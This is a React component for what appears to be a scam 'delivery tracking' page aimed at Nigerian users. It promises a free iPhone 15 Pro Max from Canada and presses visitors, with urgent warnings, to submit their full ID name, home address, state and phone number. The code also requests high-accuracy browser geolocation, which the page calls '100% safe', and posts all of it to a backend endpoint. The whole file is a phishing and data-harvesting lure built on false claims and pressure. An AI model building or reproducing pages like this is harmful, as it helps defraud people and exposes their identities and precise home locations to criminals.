import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { MapPin, Clock, Shield, AlertTriangle, CheckCircle2 } from "lucide-react";

interface FormData {
  full_name: string;
  address: string;
  state: string;
  phone: string;
}

const TrackingForm = () => {
  const [formData, setFormData] = useState<FormData>({
    full_name: "",
    address: "",
    state: "",
    phone: ""
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isGettingLocation, setIsGettingLocation] = useState(false);
  const { toast } = useToast();

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const getLocation = (): Promise<{ latitude: number; longitude: number; accuracy: number }> => {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Geolocation is not supported by this browser."));
        return;
      }

      setIsGettingLocation(true);
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setIsGettingLocation(false);
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        (error) => {
          setIsGettingLocation(false);
          reject(error);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Get geolocation
      let geoData = null;
      try {
        geoData = await getLocation();
        toast({
          title: "Location Access Granted",
          description: "Thank you for allowing location access for accurate delivery.",
        });
      } catch (geoError) {
        console.log("Geolocation denied or failed:", geoError);
        toast({
          title: "Location Access",
          description: "Location access denied. We'll use your address for delivery.",
          variant: "destructive"
        });
      }

      // Submit form data
      const response = await fetch('/functions/v1/submit-delivery', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...formData,
          geolocation: geoData
        }),
      });

      if (response.ok) {
        toast({
          title: "Package Information Updated! 📦",
          description: "Your delivery information has been confirmed. You'll receive updates via SMS.",
        });
        
        // Reset form
        setFormData({
          full_name: "",
          address: "",
          state: "",
          phone: ""
        });
      } else {
        throw new Error('Failed to submit');
      }
    } catch (error) {
      toast({
        title: "Submission Error",
        description: "There was an issue confirming your delivery. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-lg mx-auto">
      <Card className="shadow-lg border-logistics-orange/20">
        <CardHeader className="bg-gradient-to-r from-logistics-orange to-logistics-blue text-white rounded-t-lg">
          <CardTitle className="text-2xl font-bold flex items-center">
            <Shield className="w-6 h-6 mr-2" />
            🎁 Get Your iPhone 15 Pro Max Now!
          </CardTitle>
          <CardDescription className="text-white/90">
            Last step: Just confirm your details to receive your expensive Canadian iPhone today!
          </CardDescription>
        </CardHeader>
        
        <CardContent className="space-y-4 p-6">
          <div className="bg-logistics-red/10 border border-logistics-red/20 rounded-lg p-3 mb-4">
            <div className="flex items-center text-logistics-red text-sm font-medium mb-1">
              <AlertTriangle className="w-4 h-4 mr-2" />
              🚨 URGENT: Don't Lose Your iPhone!
            </div>
            <p className="text-xs text-muted-foreground">
              Your iPhone 15 Pro Max worth ₦850,000 will go back to Canada if you don't fill this form TODAY. Very simple - just 4 fields!
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="full_name" className="flex items-center text-sm font-medium">
                Your Full Name (write exactly as on your ID) <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="full_name"
                type="text"
                value={formData.full_name}
                onChange={(e) => handleInputChange("full_name", e.target.value)}
                placeholder="Example: John Emeka Okafor"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="address" className="flex items-center text-sm font-medium">
                Where should we bring your iPhone? <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="address"
                type="text"
                value={formData.address}
                onChange={(e) => handleInputChange("address", e.target.value)}
                placeholder="Example: 15 Bode Thomas Street, Surulere, Lagos"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="state" className="flex items-center text-sm font-medium">
                Which Nigerian state are you in? <span className="text-red-500 ml-1">*</span>
              </Label>
              <select
                id="state"
                value={formData.state}
                onChange={(e) => handleInputChange("state", e.target.value)}
                className="w-full px-3 py-2 border border-input bg-background rounded-md"
                required
              >
                <option value="">Choose your state</option>
                <option value="lagos">Lagos State</option>
                <option value="abuja">Abuja (FCT)</option>
                <option value="kano">Kano State</option>
                <option value="rivers">Rivers State (Port Harcourt)</option>
                <option value="oyo">Oyo State (Ibadan)</option>
                <option value="kaduna">Kaduna State</option>
                <option value="plateau">Plateau State (Jos)</option>
                <option value="anambra">Anambra State</option>
                <option value="enugu">Enugu State</option>
                <option value="delta">Delta State</option>
                <option value="other">My state is not listed here</option>
              </select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="phone" className="flex items-center text-sm font-medium">
                Your phone number <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="phone"
                type="tel"
                value={formData.phone}
                onChange={(e) => handleInputChange("phone", e.target.value)}
                placeholder="Example: 08012345678 or +2348012345678"
                required
              />
            </div>

            <div className="bg-logistics-blue/10 p-4 rounded-lg border border-logistics-blue/20">
              <div className="flex items-center mb-2">
                <MapPin className="w-4 h-4 text-logistics-blue mr-2" />
                <span className="text-sm font-medium text-logistics-navy">📍 Quick Location Check (Very Safe)</span>
              </div>
              <p className="text-xs text-muted-foreground mb-2">
                We will ask for your location to make sure your expensive iPhone goes to the right place. 
                Don't worry - it's 100% safe and helps us find your house easily.
              </p>
              <div className="flex items-center text-xs text-logistics-green">
                <CheckCircle2 className="w-3 h-3 mr-1" />
                <span>✅ Very Safe • Just One Time • Helps Us Find You</span>
              </div>
            </div>

            <div className="space-y-2">
              <Button 
                type="submit"
                className="w-full bg-gradient-to-r from-logistics-orange to-logistics-blue hover:from-logistics-orange/90 hover:to-logistics-blue/90 text-white font-medium py-3 shadow-lg" 
                disabled={isSubmitting || isGettingLocation}
              >
                {isSubmitting || isGettingLocation ? (
                  isGettingLocation ? (
                    <>
                      <Clock className="w-4 h-4 mr-2 animate-spin" />
                      Getting Your Location...
                    </>
                  ) : (
                    <>
                      <Shield className="w-4 h-4 mr-2" />
                      Preparing Your iPhone...
                    </>
                  )
                ) : (
                  <>
                    <Shield className="w-4 h-4 mr-2" />
                    🎁 YES! I Want My iPhone 15 Pro Max Now!
                  </>
                )}
              </Button>
              
              <p className="text-xs text-center text-muted-foreground">
                By clicking above, you confirm your details are correct and you want to receive your iPhone today
              </p>
            </div>
          </form>
        </CardContent>
      </Card>
    </div>
  );
};

export default TrackingForm;